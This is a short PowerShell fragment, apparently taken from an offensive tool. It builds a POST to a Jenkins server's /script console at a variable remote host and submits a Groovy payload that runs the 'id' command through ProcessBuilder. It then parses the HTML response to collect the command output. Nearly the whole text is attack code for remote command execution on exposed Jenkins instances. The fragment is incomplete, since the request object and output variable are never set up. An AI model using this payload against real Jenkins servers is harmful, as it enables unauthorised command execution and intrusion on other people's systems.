# Jenkins post-and-harvest shape: Groovy command post plus result parsing.
$url = 'http://'+$Rhost+':8080'+'/script'
$postdata = 'script=println+new+ProcessBuilder%28%27id%27%29.text&Submit=Run'
$webrequest.Method = 'POST'
$out = $output -match 'Result</h2><pre>'
